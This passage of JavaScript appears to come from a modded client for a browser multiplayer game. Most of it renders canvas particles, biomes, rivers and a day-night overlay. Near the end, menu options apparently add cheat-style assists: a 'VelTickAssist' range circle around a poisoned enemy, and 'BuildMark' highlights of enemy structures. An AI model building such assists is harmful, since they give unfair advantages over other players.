          velocityX: UTILS.randFloat(-0.3, 0.3) * speed,
          rotation: UTILS.randFloat(0, Math.PI * 2),
          rotationSpeed: UTILS.randFloat(-0.05, 0.05),
          color: `rgb(255, ${UTILS.randInt(50, 150)}, 0)`,
          flicker: 0,
        };

      case "bioluminescent":
        return {
          ...base,
          scaleMultiplier: UTILS.randFloat(0.3, 1),
          velocityY: UTILS.randFloat(-0.2, 0.2) * speed,
          velocityX: UTILS.randFloat(-0.2, 0.2) * speed,
          color: { r: 50, g: 255, b: 100 },
          blinkState: "off",
          blinkTimer: UTILS.randFloat(0, 2000),
          blinkDuration: UTILS.randFloat(500, 1500),
          blinkInterval: UTILS.randFloat(2000, 5000),
          intensity: 0,
        };

      case "runes":
        const runeShapes = ["triangle", "circle", "diamond", "cross", "spiral"];
        return {
          ...base,
          scaleMultiplier: UTILS.randFloat(0.8, 1.5),
          shape: runeShapes[UTILS.randInt(0, runeShapes.length - 1)],
          rotation: UTILS.randFloat(0, Math.PI * 2),
          rotationSpeed: UTILS.randFloat(-0.01, 0.01) * speed,
          velocityY: UTILS.randFloat(-0.1, -0.3) * speed,
          velocityX: UTILS.randFloat(-0.1, 0.1) * speed,
          color: { r: 255, g: 215, b: 0 },
          glowIntensity: 0,
        };

      case "voidCracks":
        return {
          ...base,
          scaleMultiplier: 1,
          points: this.generateCrackPoints(),
          color: { r: 75, g: 0, b: 130 },
          spreadProgress: 0,
          spreadSpeed: UTILS.randFloat(0.01, 0.03) * speed,
          maxSpread: 1,
          glowSize: 3,
        };

      case "abyssEyes":
        return {
          ...base,
          scaleMultiplier: UTILS.randFloat(0.5, 1.2),
          eyeState: "closed",
          eyeTimer: UTILS.randFloat(3000, 8000),
          openDuration: UTILS.randFloat(2000, 4000),
          pupilX: 0,
          pupilY: 0,
          pupilTargetX: 0,
          pupilTargetY: 0,
          color: { r: 255, g: 0, b: 0 },
          maxAge: UTILS.randFloat(8000, 15000),
        };

      default:
        return base;
    }
  },

  generateCrackPoints() {
    const points = [{ x: 0, y: 0 }];
    let currentX = 0,
      currentY = 0;
    const segments = UTILS.randInt(3, 6);
    for (let i = 0; i < segments; i++) {
      const angle =
        UTILS.randFloat(-Math.PI / 3, Math.PI / 3) +
        (i === 0
          ? UTILS.randFloat(0, Math.PI * 2)
          : Math.atan2(
            currentY - points[points.length - 2]?.y || 0,
            currentX - points[points.length - 2]?.x || 0,
          ));
      const length = UTILS.randFloat(15, 40);
      currentX += Math.cos(angle) * length;
      currentY += Math.sin(angle) * length;
      points.push({ x: currentX, y: currentY });
      if (Math.random() < 0.3 && i > 0) {
        const branchAngle =
          angle +
          (Math.random() < 0.5 ? 1 : -1) *
          UTILS.randFloat(Math.PI / 4, Math.PI / 2);
        const branchLength = UTILS.randFloat(8, 20);
        points.push({
          x: currentX + Math.cos(branchAngle) * branchLength,
          y: currentY + Math.sin(branchAngle) * branchLength,
          branch: true,
        });
        points.push({ x: currentX, y: currentY, branchEnd: true });
      }
    }
    return points;
  },

  // Update particle based on type
  updateParticle(particle, delta) {
    particle.age += delta;
    const speed = AB.Menu.particleSpeed || 1;
    const maxOpacity = AB.Menu.particleOpacity || 0.8;

    if (particle.age > particle.maxAge * 0.8) {
      particle.brightening = false;
    }

    if (particle.brightening) {
      particle.transparency = Math.min(
        maxOpacity,
        particle.transparency + 0.015,
      );
      if (particle.transparency >= maxOpacity) particle.brightening = false;
    } else {
      particle.transparency = Math.max(0, particle.transparency - 0.01);
      if (particle.transparency <= 0) particle.visible = false;
    }

    switch (particle.type) {
      case "voidParticles":
        particle.posX += particle.velocityX * delta * 0.05;
        particle.posY += particle.velocityY * delta * 0.05;
        particle.pulse += particle.pulseSpeed;
        break;

      case "wisps":
        particle.angle += particle.angleSpeed * delta * 0.1;
        particle.waveOffset += particle.waveFrequency * delta;
        const waveX =
          Math.sin(particle.waveOffset) * particle.waveAmplitude * 0.1;
        particle.posX += waveX * delta * 0.01;
        particle.posY += particle.velocityY * delta * 0.05;
        if (particle.trail.length >= particle.maxTrail) particle.trail.shift();
        particle.trail.push({
          x: particle.posX,
          y: particle.posY,
          alpha: particle.transparency,
        });
        break;

      case "embers":
        particle.posX += particle.velocityX * delta * 0.05;
        particle.posY += particle.velocityY * delta * 0.05;
        particle.rotation += particle.rotationSpeed * delta * 0.1;
        particle.flicker = Math.sin(particle.age * 0.01) * 0.3;
        particle.velocityX += UTILS.randFloat(-0.01, 0.01);
        break;

      case "bioluminescent":
        particle.posX += particle.velocityX * delta * 0.03;
        particle.posY += particle.velocityY * delta * 0.03;
        particle.blinkTimer += delta;
        if (
          particle.blinkState === "off" &&
          particle.blinkTimer >= particle.blinkInterval
        ) {
          particle.blinkState = "brightening";
          particle.blinkTimer = 0;
        } else if (particle.blinkState === "brightening") {
          particle.intensity = Math.min(1, particle.intensity + 0.05);
          if (particle.intensity >= 1) particle.blinkState = "on";
        } else if (
          particle.blinkState === "on" &&
          particle.blinkTimer >= particle.blinkDuration
        ) {
          particle.blinkState = "dimming";
        } else if (particle.blinkState === "dimming") {
          particle.intensity = Math.max(0, particle.intensity - 0.03);
          if (particle.intensity <= 0) {
            particle.blinkState = "off";
            particle.blinkTimer = 0;
          }
        }
        break;

      case "runes":
        particle.posX += particle.velocityX * delta * 0.03;
        particle.posY += particle.velocityY * delta * 0.03;
        particle.rotation += particle.rotationSpeed * delta * 0.1;
        particle.glowIntensity = 0.5 + Math.sin(particle.age * 0.003) * 0.5;
        break;

      case "voidCracks":
        if (particle.spreadProgress < particle.maxSpread) {
          particle.spreadProgress = Math.min(
            particle.maxSpread,
            particle.spreadProgress + particle.spreadSpeed * delta * 0.05,
          );
        }
        break;

      case "abyssEyes":
        particle.eyeTimer -= delta;
        if (particle.eyeState === "closed" && particle.eyeTimer <= 0) {
          particle.eyeState = "opening";
          particle.eyeTimer = 500;
        } else if (particle.eyeState === "opening") {
          if (particle.eyeTimer <= 0) {
            particle.eyeState = "open";
            particle.eyeTimer = particle.openDuration;
            particle.pupilTargetX = UTILS.randFloat(-1, 1);
            particle.pupilTargetY = UTILS.randFloat(-1, 1);
          }
        } else if (particle.eyeState === "open") {
          particle.pupilX += (particle.pupilTargetX - particle.pupilX) * 0.05;
          particle.pupilY += (particle.pupilTargetY - particle.pupilY) * 0.05;
          if (Math.random() < 0.005) {
            particle.pupilTargetX = UTILS.randFloat(-1, 1);
            particle.pupilTargetY = UTILS.randFloat(-1, 1);
          }
          if (particle.eyeTimer <= 0) {
            particle.eyeState = "closing";
            particle.eyeTimer = 500;
          }
        } else if (particle.eyeState === "closing") {
          if (particle.eyeTimer <= 0) {
            particle.eyeState = "closed";
            particle.eyeTimer = UTILS.randFloat(3000, 8000);
          }
        }
        break;

      case "stars":
        const starSpeed = (particle.twinkleSpeed || 0.02) * delta * 0.06;
        particle.transparency = particle.brightening
          ? Math.min(1, particle.transparency + starSpeed)
          : Math.max(0, particle.transparency - starSpeed);
        if (particle.transparency >= 1) particle.brightening = false;
        if (particle.transparency <= 0) particle.visible = false;
        break;

      default:
        const defaultSpeed = (particle.twinkleSpeed || 0.015) * delta * 0.06;
        if (particle.brightening) {
          particle.transparency = Math.min(
            maxOpacity,
            particle.transparency + defaultSpeed,
          );
          // Only stop brightening if we reached max opacity AND maxAge logic will take over later
          // But actually, we want it to stay at maxOpacity until age > maxAge * 0.8
        } else {
          particle.transparency = Math.max(0, particle.transparency - defaultSpeed);
          if (particle.transparency <= 0) particle.visible = false;
        }
        break;
    }
  },

  // Render particle based on type
  renderParticle(ctx, particle, offsetX, offsetY) {
    const sizeMultiplier = AB.Menu.particleSize || 1;
    ctx.save();
    ctx.globalAlpha = particle.transparency;

    const screenX = particle.posX - offsetX * (particle.scaleMultiplier || 1);
    const screenY = particle.posY - offsetY * (particle.scaleMultiplier || 1);

    switch (particle.type) {
      case "stars":
        ctx.translate(screenX, screenY);
        ctx.scale(particle.size, particle.size);
        ctx.beginPath();
        ctx.moveTo(0, -3);
        for (let i = 1; i < 8; i++) {
          const angle = (Math.PI / 4) * i;
          const radius = i % 2 === 0 ? 3 : 1.5;
          ctx.lineTo(Math.sin(angle) * radius, -Math.cos(angle) * radius);
        }
        ctx.closePath();
        ctx.fillStyle = particle.color;
        ctx.fill();
        break;

      case "voidParticles":
        const pulseSize = particle.size * (1 + Math.sin(particle.pulse) * 0.2);
        const gradient = ctx.createRadialGradient(
          screenX,
          screenY,
          0,
          screenX,
          screenY,
          pulseSize * 3,
        );
        gradient.addColorStop(0, particle.color);
        gradient.addColorStop(
          0.4,
          particle.color.replace("rgb", "rgba").replace(")", ", 0.5)"),
        );
        gradient.addColorStop(1, "transparent");
        ctx.fillStyle = gradient;
        ctx.beginPath();
        ctx.arc(screenX, screenY, pulseSize * 3, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = particle.color;
        ctx.beginPath();
        ctx.arc(screenX, screenY, pulseSize, 0, Math.PI * 2);
        ctx.fill();
        break;

      case "wisps":
        ctx.strokeStyle = `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${particle.transparency * 0.3})`;
        ctx.lineWidth = particle.size * 0.5;
        ctx.lineCap = "round";
        if (particle.trail.length > 1) {
          ctx.beginPath();
          ctx.moveTo(
            particle.trail[0].x - offsetX,
            particle.trail[0].y - offsetY,
          );
          for (let i = 1; i < particle.trail.length; i++) {
            ctx.lineTo(
              particle.trail[i].x - offsetX,
              particle.trail[i].y - offsetY,
            );
          }
          ctx.stroke();
        }
        const wispGradient = ctx.createRadialGradient(
          screenX,
          screenY,
          0,
          screenX,
          screenY,
          particle.size * 2,
        );
        wispGradient.addColorStop(
          0,
          `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${particle.transparency})`,
        );
        wispGradient.addColorStop(1, "transparent");
        ctx.fillStyle = wispGradient;
        ctx.beginPath();
        ctx.arc(screenX, screenY, particle.size * 2, 0, Math.PI * 2);
        ctx.fill();
        break;

      case "embers":
        ctx.translate(screenX, screenY);
        ctx.rotate(particle.rotation);
        const emberAlpha = Math.max(
          0,
          particle.transparency + particle.flicker,
        );
        ctx.globalAlpha = emberAlpha;
        const emberGradient = ctx.createRadialGradient(
          0,
          0,
          0,
          0,
          0,
          particle.size,
        );
        emberGradient.addColorStop(0, particle.color);
        emberGradient.addColorStop(
          0.6,
          particle.color.replace(")", ", 0.6)").replace("rgb", "rgba"),
        );
        emberGradient.addColorStop(1, "transparent");
        ctx.fillStyle = emberGradient;
        ctx.beginPath();
        ctx.arc(0, 0, particle.size, 0, Math.PI * 2);
        ctx.fill();
        break;

      case "bioluminescent":
        const bioIntensity = particle.intensity * particle.transparency;
        if (bioIntensity > 0.05) {
          const bioGradient = ctx.createRadialGradient(
            screenX,
            screenY,
            0,
            screenX,
            screenY,
            particle.size * 4,
          );
          bioGradient.addColorStop(
            0,
            `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${bioIntensity})`,
          );
          bioGradient.addColorStop(
            0.3,
            `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${bioIntensity * 0.5})`,
          );
          bioGradient.addColorStop(1, "transparent");
          ctx.fillStyle = bioGradient;
          ctx.beginPath();
          ctx.arc(screenX, screenY, particle.size * 4, 0, Math.PI * 2);
          ctx.fill();
        }
        ctx.globalAlpha = particle.transparency * 0.3 + bioIntensity * 0.7;
        ctx.fillStyle = `rgb(${particle.color.r}, ${particle.color.g}, ${particle.color.b})`;
        ctx.beginPath();
        ctx.arc(screenX, screenY, particle.size * 0.5, 0, Math.PI * 2);
        ctx.fill();
        break;

      case "runes":
        ctx.translate(screenX, screenY);
        ctx.rotate(particle.rotation);
        ctx.strokeStyle = `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${particle.transparency})`;
        ctx.lineWidth = 1.5 * sizeMultiplier;
        ctx.shadowColor = `rgb(${particle.color.r}, ${particle.color.g}, ${particle.color.b})`;
        ctx.shadowBlur = 10 * particle.glowIntensity;
        const runeSize = particle.size * 2;
        ctx.beginPath();
        switch (particle.shape) {
          case "triangle":
            ctx.moveTo(0, -runeSize);
            ctx.lineTo(runeSize * 0.866, runeSize * 0.5);
            ctx.lineTo(-runeSize * 0.866, runeSize * 0.5);
            ctx.closePath();
            break;
          case "circle":
            ctx.arc(0, 0, runeSize, 0, Math.PI * 2);
            ctx.moveTo(runeSize * 0.5, 0);
            ctx.arc(0, 0, runeSize * 0.5, 0, Math.PI * 2);
            break;
          case "diamond":
            ctx.moveTo(0, -runeSize);
            ctx.lineTo(runeSize * 0.7, 0);
            ctx.lineTo(0, runeSize);
            ctx.lineTo(-runeSize * 0.7, 0);
            ctx.closePath();
            break;
          case "cross":
            ctx.moveTo(0, -runeSize);
            ctx.lineTo(0, runeSize);
            ctx.moveTo(-runeSize, 0);
            ctx.lineTo(runeSize, 0);
            break;
          case "spiral":
            for (let i = 0; i < 720; i += 10) {
              const rad = (i * Math.PI) / 180;
              const r = (runeSize * i) / 720;
              const x = Math.cos(rad) * r;
              const y = Math.sin(rad) * r;
              if (i === 0) ctx.moveTo(x, y);
              else ctx.lineTo(x, y);
            }
            break;
        }
        ctx.stroke();
        ctx.shadowBlur = 0;
        break;

      case "voidCracks":
        ctx.translate(screenX, screenY);
        ctx.strokeStyle = `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${particle.transparency})`;
        ctx.lineWidth = 2 * sizeMultiplier;
        ctx.shadowColor = `rgb(${particle.color.r}, ${particle.color.g}, ${particle.color.b})`;
        ctx.shadowBlur = particle.glowSize * 3;
        ctx.lineCap = "round";
        const points = particle.points;
        const visiblePoints = Math.floor(
          points.length * particle.spreadProgress,
        );
        if (visiblePoints > 1) {
          ctx.beginPath();
          ctx.moveTo(points[0].x, points[0].y);
          for (let i = 1; i < visiblePoints; i++) {
            if (points[i].branchEnd) {
              ctx.moveTo(points[i].x, points[i].y);
            } else if (points[i].branch) {
              const prevPoint = points[i - 1];
              ctx.moveTo(prevPoint.x, prevPoint.y);
              ctx.lineTo(points[i].x, points[i].y);
            } else {
              ctx.lineTo(points[i].x, points[i].y);
            }
          }
          ctx.stroke();
        }
        ctx.shadowBlur = 0;
        break;

      case "abyssEyes":
        ctx.translate(screenX, screenY);
        const eyeSize = particle.size * 3;
        let openAmount = 0;
        if (particle.eyeState === "opening")
          openAmount = 1 - particle.eyeTimer / 500;
        else if (particle.eyeState === "open") openAmount = 1;
        else if (particle.eyeState === "closing")
          openAmount = particle.eyeTimer / 500;
        if (openAmount > 0.05) {
          ctx.fillStyle = `rgba(0, 0, 0, ${particle.transparency * 0.8})`;
          ctx.beginPath();
          ctx.ellipse(
            0,
            0,
            eyeSize,
            eyeSize * openAmount * 0.6,
            0,
            0,
            Math.PI * 2,
          );
          ctx.fill();
          const irisGradient = ctx.createRadialGradient(
            0,
            0,
            0,
            0,
            0,
            eyeSize * 0.6,
          );
          irisGradient.addColorStop(
            0,
            `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${particle.transparency})`,
          );
          irisGradient.addColorStop(
            1,
            `rgba(${particle.color.r * 0.5}, ${particle.color.g * 0.5}, ${particle.color.b * 0.5}, ${particle.transparency})`,
          );
          ctx.fillStyle = irisGradient;
          ctx.beginPath();
          ctx.ellipse(
            0,
            0,
            eyeSize * 0.5,
            eyeSize * openAmount * 0.4,
            0,
            0,
            Math.PI * 2,
          );
          ctx.fill();
          const pupilX = particle.pupilX * eyeSize * 0.15;
          const pupilY = particle.pupilY * eyeSize * openAmount * 0.1;
          ctx.fillStyle = `rgba(0, 0, 0, ${particle.transparency})`;
          ctx.beginPath();
          ctx.ellipse(
            pupilX,
            pupilY,
            eyeSize * 0.2,
            eyeSize * openAmount * 0.25,
            0,
            0,
            Math.PI * 2,
          );
          ctx.fill();
          ctx.fillStyle = `rgba(255, 255, 255, ${particle.transparency * 0.6})`;
          ctx.beginPath();
          ctx.arc(
            pupilX - eyeSize * 0.08,
            pupilY - eyeSize * openAmount * 0.08,
            eyeSize * 0.06,
            0,
            Math.PI * 2,
          );
          ctx.fill();
        }
        ctx.strokeStyle = `rgba(${particle.color.r}, ${particle.color.g}, ${particle.color.b}, ${particle.transparency * 0.5})`;
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(-eyeSize, 0);
        ctx.quadraticCurveTo(0, -eyeSize * openAmount * 0.8, eyeSize, 0);
        ctx.quadraticCurveTo(0, eyeSize * openAmount * 0.8, -eyeSize, 0);
        ctx.stroke();
        break;

      default:
        ctx.fillStyle = particle.color || "#9B5CFF";
        ctx.beginPath();
        ctx.arc(screenX, screenY, particle.size, 0, Math.PI * 2);
        ctx.fill();
    }

    ctx.restore();
  },
};

function updateBloodParticles(delta, offsetX, offsetY) {
  for (let i = bloodParticles.length - 1; i >= 0; i--) {
    const particle = bloodParticles[i];
    const alive = particle.update(delta);
    if (alive) {
      mainContext.save();
      mainContext.globalAlpha = particle.life;
      mainContext.fillStyle = particle.color;
      mainContext.beginPath();
      mainContext.arc(
        particle.x - offsetX,
        particle.y - offsetY,
        particle.size,
        0,
        Math.PI * 2,
      );
      mainContext.fill();
      mainContext.restore();
    } else {
      bloodParticles.splice(i, 1);
    }
  }
}

let particleSpawnTimer = 0;

let renderShapes = (mainContext, delta, offsetX, offsetY) => {
  let targetOpacity = 0;
  if (AB.Menu.dayNightCycle) {
    const cycleDuration = (AB.Menu.cycleDuration || 720) * 1000;
    const time = (Date.now() % cycleDuration) / cycleDuration;
    targetOpacity = (-Math.cos(time * Math.PI * 2) + 1) / 4;
  } else if (nightModeState.isEnabled) {
    targetOpacity = 0.5;
  }

  nightModeState.overlay.opacity =
    nightModeState.overlay.opacity < targetOpacity
      ? Math.min(targetOpacity, nightModeState.overlay.opacity + 0.0005 * delta)
      : Math.max(targetOpacity, nightModeState.overlay.opacity - 0.0005 * delta);

  updateBloodParticles(delta, offsetX, offsetY);

  if (nightModeState.overlay.opacity > 0 && AB.Menu.showStars) {
    if (nightModeState.overlay.opacity > 0.3 && starSpawnTimer > 300) {
      starSpawnTimer = 0;
      let starCount = UTILS.randInt(3, 5);
      for (let i = 0; i < starCount; i++) {
        let scaleMultiplier = UTILS.randFloat(1, 3);
        nightModeState.starField.push({
          scaleMultiplier,
          posX: offsetX * scaleMultiplier + UTILS.randFloat(0, maxScreenWidth),
          posY: offsetY * scaleMultiplier + UTILS.randFloat(0, maxScreenHeight),
          size: UTILS.randFloat(2, 6),
          transparency: 0,
          visible: true,
          brightening: true,
          color: `rgb(255, 255, ${UTILS.randInt(0, 255)})`,
        });
      }
    } else {
      starSpawnTimer += delta;
    }
  }

  nightModeState.starField = nightModeState.starField.filter(
    (star) => star.visible,
  );

  for (let i = 0; i < nightModeState.starField.length; i++) {
    let star = nightModeState.starField[i];

    if (star.brightening) {
      star.transparency = Math.min(1, star.transparency + 0.02);
      if (star.transparency >= 1) star.brightening = false;
    } else {
      star.transparency = Math.max(0, star.transparency - 0.02);
      if (star.transparency <= 0) star.visible = false;
    }

    let renderStar = (mainContext, size) => {
      mainContext.beginPath();
      mainContext.moveTo(0, -size);
      for (let i = 1; i < 8; i++) {
        let angle = (Math.PI / 4) * i;
        let radius = i % 2 === 0 ? size : size / 2;
        mainContext.lineTo(Math.sin(angle) * radius, -Math.cos(angle) * radius);
      }
      mainContext.closePath();
    };

    mainContext.save();
    mainContext.globalAlpha = star.transparency;
    mainContext.translate(
      star.posX - offsetX * star.scaleMultiplier,
      star.posY - offsetY * star.scaleMultiplier,
    );
    mainContext.scale(star.size, star.size);
    renderStar(mainContext, 3);
    mainContext.fillStyle = star.color;
    mainContext.fill();
    mainContext.restore();
  }
};

function updateGame() {
  if (!inGame) {
    menuBackground.update(delta);
    menuBackground.render(mainContext);
    return;
  }
  updateWiggles();
  const liztSet = new Set(liztobj);

  if (gameObjects.length && inGame) {
    const maxDistSq = 2500 * 2500;

    gameObjects.forEach((tmp) => {
      const dx = tmp.x - player.x;
      const dy = tmp.y - player.y;
      const distSq = dx * dx + dy * dy;

      const inRange = distSq <= maxDistSq;
      const inList = liztSet.has(tmp);

      if (inRange) {
        if (!inList) {
          liztobj.push(tmp);
          liztSet.add(tmp);
        }
        tmp.render = true;
      } else {
        if (inList) {
          liztSet.delete(tmp);
          const index = liztobj.indexOf(tmp);
          if (index !== -1) liztobj.splice(index, 1);
        }
        tmp.render = false;
      }
    });
  }

  mainContext.beginPath();
  mainContext.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
  mainContext.globalAlpha = 1;

  if (player) {
    let easingFactor = 0.1;
    camX += (player.x - camX) * easingFactor;
    camY += (player.y - camY) * easingFactor;
    let time = performance.now() * 0.002;
    let floatFactor = 1.5;
    camX += floatFactor * Math.sin(time);
    camY += floatFactor * Math.cos(time);
  } else {
    camX = config.mapScale / 2;
    camY = config.mapScale / 2;
  }

  let lastTime = now - 1000 / config.serverUpdateRate;
  let tmpDiff;
  for (let i = 0; i < players.length + ais.length; ++i) {
    tmpObj = players[i] || ais[i - players.length];
    if (tmpObj && tmpObj.visible) {
      if (tmpObj.forcePos) {
        tmpObj.x = tmpObj.x2;
        tmpObj.y = tmpObj.y2;
        tmpObj.dir = tmpObj.d2;
      } else {
        let total = tmpObj.t2 - tmpObj.t1;
        let fraction = lastTime - tmpObj.t1;
        let ratio = fraction / total;
        let rate = 170;
        tmpObj.dt += delta;
        let tmpRate = Math.min(1.7, tmpObj.dt / rate);
        tmpDiff = tmpObj.x2 - tmpObj.x1;
        tmpObj.x = tmpObj.x1 + tmpDiff * tmpRate;
        tmpDiff = tmpObj.y2 - tmpObj.y1;
        tmpObj.y = tmpObj.y1 + tmpDiff * tmpRate;
        if (config.anotherVisual) {
          tmpObj.dir = Math.lerpAngle(
            tmpObj.d2,
            tmpObj.d1,
            Math.min(1.2, ratio),
          );
        } else {
          tmpObj.dir = Math.lerpAngle(
            tmpObj.d2,
            tmpObj.d1,
            Math.min(1.2, ratio),
          );
        }
      }
    }
  }

  let xOffset = camX - maxScreenWidth / 2;
  let yOffset = camY - maxScreenHeight / 2;
  volcano.xof = xOffset;
  volcano.yof = yOffset;
  // Get biome colors from menu settings
  const greenBiomeColor = AB.Menu.GreenBiomeColor || "#b6db66";
  const snowBiomeColor = AB.Menu.SnowBiomeColor || "#ffffff";
  const desertBiomeColor = AB.Menu.DesertBiomeColor || "#dbc666";
  const riverColor = AB.Menu.RiverColor || "#91b2db";

  if (
    config.snowBiomeTop - yOffset <= 0 &&
    config.mapScale - config.snowBiomeTop - yOffset >= maxScreenHeight
  ) {
    mainContext.fillStyle = greenBiomeColor;
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  } else if (config.mapScale - config.snowBiomeTop - yOffset <= 0) {
    mainContext.fillStyle = greenBiomeColor;
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
    const desertTop = Math.max(
      0,
      config.mapScale - config.snowBiomeTop - yOffset,
    );
    if (desertTop < maxScreenHeight) {
      mainContext.fillStyle = desertBiomeColor;
      mainContext.fillRect(
        0,
        desertTop,
        maxScreenWidth,
        maxScreenHeight - desertTop,
      );
    }
  } else if (config.snowBiomeTop - yOffset >= maxScreenHeight) {
    mainContext.fillStyle = snowBiomeColor;
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  } else if (config.snowBiomeTop - yOffset >= 0) {
    mainContext.fillStyle = snowBiomeColor;
    mainContext.fillRect(0, 0, maxScreenWidth, config.snowBiomeTop - yOffset);
    mainContext.fillStyle = greenBiomeColor;
    mainContext.fillRect(
      0,
      config.snowBiomeTop - yOffset,
      maxScreenWidth,
      maxScreenHeight - (config.snowBiomeTop - yOffset),
    );
    if (AB.Menu.ShorePath !== false)
      snowPath.render(snowBiomeColor, xOffset, yOffset);
  } else {
    mainContext.fillStyle = greenBiomeColor;
    mainContext.fillRect(
      0,
      0,
      maxScreenWidth,
      config.mapScale - config.snowBiomeTop - yOffset,
    );
    mainContext.fillStyle = desertBiomeColor;
    mainContext.fillRect(
      0,
      config.mapScale - config.snowBiomeTop - yOffset,
      maxScreenWidth,
      maxScreenHeight - (config.mapScale - config.snowBiomeTop - yOffset),
    );
    if (AB.Menu.ShorePath !== false)
      desertPath.render(greenBiomeColor, xOffset, yOffset);
  }

  if (!firstSetup && AB.Menu.River !== false) {
    waterMult += waterPlus * config.waveSpeed * delta;

    if (waterMult >= config.waveMax) {
      waterMult = config.waveMax;
      waterPlus = -1;
    } else if (waterMult <= 1) {
      waterMult = 1;
      waterPlus = 1;
    }

    // smooth only the rendered multiplier (keeps your state update unchanged)
    const t = (waterMult - 1) / (config.waveMax - 1); // 0..1
    const s = t * t * (3 - 2 * t); // smoothstep 0..1
    const wm = AB.Menu.RiverWave !== false ? 1 + s * (config.waveMax - 1) : 1; // back to 1..waveMax

    mainContext.globalAlpha = 1;
    mainContext.fillStyle = desertBiomeColor;
    renderWaterBodies(xOffset, yOffset, mainContext, config.riverPadding);

    mainContext.fillStyle = riverColor;
    renderWaterBodies(xOffset, yOffset, mainContext, (wm - 1) * 250);
  }

  mainContext.globalAlpha = 1;
  mainContext.strokeStyle = outlineColor;
  renderGameObjects(-1, xOffset, yOffset);

  mainContext.globalAlpha = 1;
  mainContext.lineWidth = outlineWidth;
  renderProjectiles(0, xOffset, yOffset);

  renderPlayers(xOffset, yOffset, 0);

  mainContext.globalAlpha = 1;
  for (let i = 0; i < ais.length; ++i) {
    tmpObj = ais[i];
    if (tmpObj.active && tmpObj.visible) {
      tmpObj.animate(delta);
      mainContext.save();
      mainContext.translate(tmpObj.x - xOffset, tmpObj.y - yOffset);
      mainContext.rotate(tmpObj.dir + tmpObj.dirPlus - Math.PI / 2);
      renderAI(tmpObj, mainContext);
      mainContext.restore();
    }
  }
  renderShapes(mainContext, delta, xOffset, yOffset);
  renderGameObjects(0, xOffset, yOffset);
  renderProjectiles(1, xOffset, yOffset);
  renderGameObjects(1, xOffset, yOffset);
  renderPlayers(xOffset, yOffset, 1);
  renderGameObjects(2, xOffset, yOffset);
  renderGameObjects(3, xOffset, yOffset);

  mainContext.globalAlpha = 1;
  mainContext.strokeStyle = outlineColor;
  renderDeadPlayers(xOffset, yOffset);

  renderBrokenObjects(xOffset, yOffset);

  mainContext.fillStyle = "#000";
  mainContext.globalAlpha = 0.09;
  if (xOffset <= 0) {
    mainContext.fillRect(0, 0, -xOffset, maxScreenHeight);
  }
  if (config.mapScale - xOffset <= maxScreenWidth) {
    var tmpY = Math.max(0, -yOffset);
    mainContext.fillRect(
      config.mapScale - xOffset,
      tmpY,
      maxScreenWidth - (config.mapScale - xOffset),
      maxScreenHeight - tmpY,
    );
  }
  if (yOffset <= 0) {
    mainContext.fillRect(-xOffset, 0, maxScreenWidth + xOffset, -yOffset);
  }
  if (config.mapScale - yOffset <= maxScreenHeight) {
    var tmpX = Math.max(0, -xOffset);
    var tmpMin = 0;
    if (config.mapScale - xOffset <= maxScreenWidth) {
      tmpMin = maxScreenWidth - (config.mapScale - xOffset);
    }
    mainContext.fillRect(
      tmpX,
      config.mapScale - yOffset,
      maxScreenWidth - tmpX - tmpMin,
      maxScreenHeight - (config.mapScale - yOffset),
    );
  }

  mainContext.globalAlpha = 1;
  mainContext.fillStyle = "rgba(0, 0, 70, 0.35)";
  mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);

  if (AB.Menu.nightMode) {
    mainContext.globalAlpha = 0.35;
    mainContext.fillStyle = "rgb(0, 0, 100)";
    mainContext.fillRect(0, 0, maxScreenWidth, maxScreenHeight);
  }
  mainContext.globalAlpha = 1;

  if (
    AB.Menu.VelTickAssist &&
    near &&
    near.alive &&
    near.lastPoisonAtMs &&
    Date.now() - near.lastPoisonAtMs < 2500
  ) {
    const maxRange = 245;
    mainContext.save();
    mainContext.globalAlpha = 1;
    mainContext.globalCompositeOperation = "source-over";
    Mod.Draw.Circle(
      mainContext,
      near.x,
      near.y,
      maxRange,
      0,
      Math.PI * 2,
      2,
      "rgba(0, 0, 0, 0.35)",
      false,
    );
    mainContext.restore();
  }

  if (AB.Menu.BuildMark) {
    const xOffset = camX - maxScreenWidth / 2;
    const yOffset = camY - maxScreenHeight / 2;
    const buildMarkRange = AB.Menu.BuildMarkRange || 1500;
    const markType = AB.Menu.BuildMarkType || "Circle";

    liztobj.forEach((tmpObj) => {
      if (!tmpObj.isItem || !tmpObj.active) return;
      if (
        Math.hypot(tmpObj.y - player.y, tmpObj.x - player.x) >= buildMarkRange
      )
        return;

      const isPlayer = tmpObj.owner && tmpObj.owner.sid === player.sid;
      const isTeam =
        !isPlayer && tmpObj.isTeamObject && tmpObj.isTeamObject(player);
      const isEnemy = !isPlayer && !isTeam;

      if (isPlayer && !AB.Menu.PlayerBuildMarkToggle) return;
      if (isTeam && !AB.Menu.TeamBuildMarkToggle) return;
      if (isEnemy && !AB.Menu.EnemyBuildMarkToggle) return;

      const fillColor = isPlayer
        ? AB.Menu.PlayerBuildMark || "#8ecc51"
        : isTeam
          ? AB.Menu.TeamBuildMark || "#345eeb"
          : AB.Menu.EnemyBuildMark || "#cc5151";

      const markSize = isPlayer
        ? AB.Menu.PlayerBuildMarkSize || 8
        : isTeam
          ? AB.Menu.TeamBuildMarkSize || 8
          : AB.Menu.EnemyBuildMarkSize || 8;

      const tmpX = tmpObj.x + (tmpObj.xWiggle || 0) - xOffset;
      const tmpY = tmpObj.y + (tmpObj.yWiggle || 0) - yOffset;

      mainContext.save();
      mainContext.translate(tmpX, tmpY);

      if (markType === "Circle") {
        mainContext.strokeStyle = outlineColor;
        mainContext.lineWidth = markSize * 1.25;
        mainContext.beginPath();
        mainContext.arc(0, 0, markSize, 0, Math.PI * 2);
        mainContext.stroke();

        mainContext.fillStyle = fillColor;
